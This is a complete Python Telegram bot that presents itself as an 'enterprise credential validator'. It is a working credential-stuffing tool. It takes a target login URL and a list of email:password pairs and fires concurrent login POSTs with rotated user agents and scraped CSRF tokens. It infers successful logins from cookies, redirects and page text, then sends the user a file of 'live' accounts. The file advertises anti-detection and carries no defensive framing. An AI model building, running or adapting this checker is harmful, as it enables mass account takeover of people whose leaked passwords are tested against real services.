#!/usr/bin/env python3
"""
🔥 ENTERPRISE CREDENTIAL VALIDATOR v2.0
REAL HTTP AUTHENTICATION VALIDATOR
Railway Production Ready | Anti-Detection | Live Hit Detection
"""

import os
import re
import asyncio
import logging
import random
import time
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass
from datetime import datetime, timedelta
from urllib.parse import urlparse, urljoin, parse_qs
from collections import defaultdict
import hashlib
import zipfile
from io import BytesIO

import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, MessageHandler, CallbackQueryHandler,
    ContextTypes, filters, ConversationHandler
)
from telegram.constants import ParseMode, ChatAction

# ==================== CONFIG ====================
TELEGRAM_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
MAX_CONCURRENT = int(os.getenv("MAX_CONCURRENT", "5"))
REQUEST_TIMEOUT = int(os.getenv("REQUEST_TIMEOUT", "20"))
DELAY_MIN = float(os.getenv("DELAY_MIN", "1.0"))
DELAY_MAX = float(os.getenv("DELAY_MAX", "3.0"))
MAX_RETRIES = int(os.getenv("MAX_RETRIES", "2"))

if not TELEGRAM_TOKEN:
    raise RuntimeError("Missing TELEGRAM_BOT_TOKEN")

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
logger = logging.getLogger(__name__)

# ==================== STATES ====================
WAITING_URL, WAITING_FILE = range(2)

# ==================== SUCCESS DETECTION ====================
SUCCESS_INDICATORS = [
    # Cookies
    'session_id', 'auth_token', 'access_token', 'user_session',
    'logged_in', 'user_id', 'customer_id',
    
    # Redirect paths
    '/dashboard', '/profile', '/account', '/home', '/billing',
    '/orders', '/settings', '/myaccount', '/user',
    
    # Content markers
    '"logout"', '"sign out"', 'signout', 'log out',
    'welcome', 'your account', 'my profile', 'account settings',
    'change password', 'subscription', 'payment method',
    
    # Status messages
    'successfully logged', 'login successful', 'welcome back',
    
    # Common dashboard elements
    'balance:', 'recent activity', 'my transactions'
]

FAILURE_INDICATORS = [
    'invalid', 'incorrect', 'failed', 'error',
    'wrong password', 'bad credentials',
    'too many attempts', 'account locked',
    '2fa', 'verification required', 'captcha'
]

@dataclass
class Credential:
    email: str
    password: str
    original_line: str
    line_number: int

class RealCredentialValidator:
    def __init__(self):
        self.user_sessions: Dict[int, Dict] = {}
        self.live_creds: Dict[int, List[Credential]] = defaultdict(list)
        self.stats: Dict[int, Dict] = defaultdict(lambda: {'processed': 0, 'live': 0})
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0'
        ]

    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        await update.message.reply_text(
            "🔥 *REAL CREDENTIAL VALIDATOR*\n\n"
            "1️⃣ Send login page URL\n"
            "2️⃣ Upload credentials file\n\n"
            "*Format: `email:password` per line*",
            parse_mode=ParseMode.MARKDOWN
        )
        return WAITING_URL

    async def handle_url(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
        url = update.message.text.strip()
        if not self._validate_url(url):
            await update.message.reply_text("❌ Invalid login URL")
            return WAITING_URL
        
        user_id = update.effective_user.id
        self.user_sessions[user_id] = {
            'url': url,
            'base_domain': urlparse(url).netloc,
            'start_time': datetime.now()
        }
        
        await update.message.reply_text(
            f"✅ Target: `{url}`\n\n📤 Upload credentials TXT file",
            parse_mode=ParseMode.MARKDOWN
        )
        return WAITING_FILE

    async def handle_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        user_id = update.effective_user.id
        if user_id not in self.user_sessions:
            await update.message.reply_text("❌ Start with /start first")
            return ConversationHandler.END
        
        document = update.message.document
        if not document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Upload TXT file only")
            return WAITING_FILE
        
        await context.bot.send_chat_action(chat_id=user_id, action=ChatAction.TYPING)
        
        try:
            file_obj = await context.bot.get_file(document.file_id)
            content = await file_obj.download_as_bytearray()
            creds = self._parse_creds(content.decode())
            
            if not creds:
                await update.message.reply_text("❌ No valid credentials found")
                return ConversationHandler.END
            
            self.live_creds[user_id] = []
            self.stats[user_id] = {'processed': 0, 'live': 0, 'total': len(creds)}
            
            progress_msg = await update.message.reply_text(
                f"🚀 Starting validation...\n"
                f"📊 Total: {len(creds):,}\n"
                f"⚡ Concurrent: {MAX_CONCURRENT}\n⏳ Processing..."
            )
            
            # Start background processing
            asyncio.create_task(
                self._process_batch(context, user_id, creds, progress_msg.message_id)
            )
            
            return ConversationHandler.END
            
        except Exception as e:
            logger.error(f"File processing error: {e}")
            await update.message.reply_text(f"❌ Error: {str(e)}")
            return ConversationHandler.END

    async def _process_batch(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, 
                           creds: List[Credential], progress_msg_id: int):
        """REAL HTTP VALIDATION ENGINE"""
        target_url = self.user_sessions[user_id]['url']
        semaphore = asyncio.Semaphore(MAX_CONCURRENT)
        
        connector = aiohttp.TCPConnector(limit=MAX_CONCURRENT*2, limit_per_host=MAX_CONCURRENT)
        timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            tasks = []
            for cred in creds:
                task = self._validate_credential(session, semaphore, target_url, cred, user_id)
                tasks.append(task)
            
            # Process all credentials
            results = await asyncio.gather(*tasks, return_exceptions=True)
            
            # Update final stats
            live_count = len(self.live_creds[user_id])
            await self._send_final_report(context, user_id, live_count, len(creds))
            
            # Send results file
            if live_count > 0:
                await self._send_results_file(context, user_id)

    async def _validate_credential(self, session: aiohttp.ClientSession, 
                                 semaphore: asyncio.Semaphore,
                                 target_url: str, cred: Credential, 
                                 user_id: int) -> Optional[Credential]:
        """REAL LOGIN ATTEMPT - HTTP POST AUTHENTICATION"""
        async with semaphore:
            try:
                # Rotate user agent
                headers = {
                    'User-Agent': random.choice(self.user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Accept-Encoding': 'gzip, deflate',
                    'Connection': 'keep-alive',
                    'Referer': target_url,
                    'Origin': '/'.join(target_url.split('/')[:3]),
                    'Sec-Fetch-Dest': 'document',
                    'Sec-Fetch-Mode': 'navigate',
                    'Sec-Fetch-Site': 'same-origin'
                }
                
                # Step 1: GET login page (get CSRF tokens, etc)
                async with session.get(target_url, headers=headers) as login_resp:
                    login_html = await login_resp.text()
                    
                    # Extract potential CSRF tokens
                    csrf_token = self._extract_csrf(login_html)
                    
                    # Step 2: Try common login endpoints
                    endpoints = [
                        target_url,
                        urljoin(target_url, '/login'),
                        urljoin(target_url, '/auth/login'),
                        urljoin(target_url, '/signin'),
                        urljoin(target_url, '/account/login')
                    ]
                    
                    payloads = [
                        {'email': cred.email, 'password': cred.password},
                        {'username': cred.email, 'password': cred.password},
                        {'email': cred.email, 'pass': cred.password},
                        {'login': cred.email, 'password': cred.password},
                        {'user': cred.email, 'pwd': cred.password}
                    ]
                    
                    # Add CSRF if found
                    for payload in payloads:
                        if csrf_token:
                            payload['_token'] = csrf_token
                            payload['csrf_token'] = csrf_token
                        
                        for endpoint in endpoints:
                            try:
                                # REAL LOGIN POST REQUEST
                                async with session.post(
                                    endpoint,
                                    data=payload,
                                    headers=headers,
                                    allow_redirects=True,
                                    max_redirects=5
                                ) as auth_resp:
                                    
                                    final_url = str(auth_resp.url)
                                    content = await auth_resp.text()
                                    cookies = auth_resp.cookies
                                    
                                    # SUCCESS CHECK #1: Authentication cookies
                                    if self._has_auth_cookies(cookies):
                                        logger.info(f"LIVE: {cred.email}")
                                        self.stats[user_id]['processed'] += 1
                                        self.live_creds[user_id].append(cred)
                                        return cred
                                    
                                    # SUCCESS CHECK #2: Dashboard redirect
                                    if self._is_dashboard_redirect(final_url):
                                        logger.info(f"LIVE: {cred.email} (redirect)")
                                        self.stats[user_id]['processed'] += 1
                                        self.live_creds[user_id].append(cred)
                                        return cred
                                    
                                    # SUCCESS CHECK #3: Content analysis
                                    if self._is_success_content(content, final_url):
                                        logger.info(f"LIVE: {cred.email} (content)")
                                        self.stats[user_id]['processed'] += 1
                                        self.live_creds[user_id].append(cred)
                                        return cred
                                    
                                    # Early failure exit
                                    if self._is_failure_content(content):
                                        self.stats[user_id]['processed'] += 1
                                        return None
                                    
                            except:
                                continue
                
                self.stats[user_id]['processed'] += 1
                return None
                
            except Exception as e:
                self.stats[user_id]['processed'] += 1
                logger.debug(f"Validation error for {cred.email}: {e}")
                return None

    def _extract_csrf(self, html: str) -> Optional[str]:
        """Extract CSRF tokens from login form"""
        patterns = [
            r'name=["\']?_?token["\']?\s*[^>]*value=["\']([^"\']+)',
            r'name=["\']?csrf["\']?\s*[^>]*value=["\']([^"\']+)',
            r'id=["\']?_?token["\']?\s*[^>]*value=["\']([^"\']+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, html, re.IGNORECASE)
            if match:
                return match.group(1)
        return None

    def _has_auth_cookies(self, cookies) -> bool:
        """Check for authentication session cookies"""
        cookie_names = ['session', 'auth', 'token', 'user_session', 'access_token']
        for cookie in cookies.values():
            name = cookie.key.lower()
            if any(indicator in name for indicator in cookie_names):
                return True
        return False

    def _is_dashboard_redirect(self, url: str) -> bool:
        """Check if redirected to dashboard"""
        dashboard_paths = ['/dashboard', '/profile', '/account', '/home', '/billing']
        return any(path in url.lower() for path in dashboard_paths)

    def _is_success_content(self, content: str, url: str) -> bool:
        """Advanced content-based success detection"""
        content_lower = content.lower()
        
        # Success indicators
        for indicator in SUCCESS_INDICATORS:
            if indicator in content_lower:
                return True
        
        # Logout button detection
        logout_patterns = [
            r'href[^>]*logout', r'button[^>]*logout',
            r'signout["\'][^>]*class', r'log out[^>]*button'
        ]
        for pattern in logout_patterns:
            if re.search(pattern, content_lower, re.I):
                return True
        
        return False

    def _is_failure_content(self, content: str) -> bool:
        """Quick failure detection"""
        content_lower = content.lower()
        return any(indicator in content_lower for indicator in FAILURE_INDICATORS)

    async def _send_final_report(self, context: ContextTypes.DEFAULT_TYPE, user_id: int, 
                               live_count: int, total: int):
        """Send completion report"""
        success_rate = (live_count / total * 100) if total > 0 else 0
        
        report = (
            f"✅ *VALIDATION COMPLETE*\n\n"
            f"📊 *Results:*\n"
            f"• Total tested: {total:,}\n"
            f"• ✅ LIVE: {live_count:,}\n"
            f"• 📈 Success rate: {success_rate:.1f}%\n"
            f"• ⏱️ Duration: {datetime.now() - self.user_sessions[user_id]['start_time']}"
        )
        
        await context.bot.send_message(user_id, report, parse_mode=ParseMode.MARKDOWN)

    async def _send_results_file(self, context: ContextTypes.DEFAULT_TYPE, user_id: int):
        """Export live credentials"""
        creds = self.live_creds[user_id]
        content = "# LIVE VALIDATED CREDENTIALS\n\n"
        for cred in creds:
            content += f"{cred.original_line}  # Line {cred.line_number}\n"
        
        buffer = BytesIO(content.encode())
        buffer.seek(0)
        
        caption = f"✅ *{len(creds)} LIVE CREDENTIALS*"
        await context.bot.send_document(
            chat_id=user_id,
            document=buffer,
            filename=f"live_creds_{int(time.time())}.txt",
            caption=caption,
            parse_mode=ParseMode.MARKDOWN
        )

    def _parse_creds(self, content: str) -> List[Credential]:
        """Parse email:pass file"""
        creds = []
        separators = [':', ';', '|']
        
        for i, line in enumerate(content.splitlines(), 1):
            line = line.strip()
            if len(line) < 10:
                continue
            
            for sep in separators:
                if sep in line:
                    parts = line.split(sep, 1)
                    if len(parts) == 2:
                        email, password = parts[0].strip(), parts[1].strip()
                        if '@' in email and len(password) >= 4:
                            creds.append(Credential(email, password, line, i))
                            break
        return creds

    def _validate_url(self, url: str) -> bool:
        """Validate login URL"""
        try:
            parsed = urlparse(url)
            return parsed.scheme in ('http', 'https') and parsed.netloc
        except:
            return False

# ==================== MAIN ====================
def main():
    app = Application.builder().token(TELEGRAM_TOKEN).build()
    validator = RealCredentialValidator()
    
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("start", validator.start)],
        states={
            WAITING_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, validator.handle_url)],
            WAITING_FILE: [MessageHandler(filters.Document.ALL, validator.handle_file)],
        },
        fallbacks=[CommandHandler("cancel", lambda u, c: ConversationHandler.END)],
    )
    
    app.add_handler(conv_handler)
    
    print("🔥 Real Credential Validator Started")
    print(f"⚙️ Max concurrent: {MAX_CONCURRENT}")
    
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
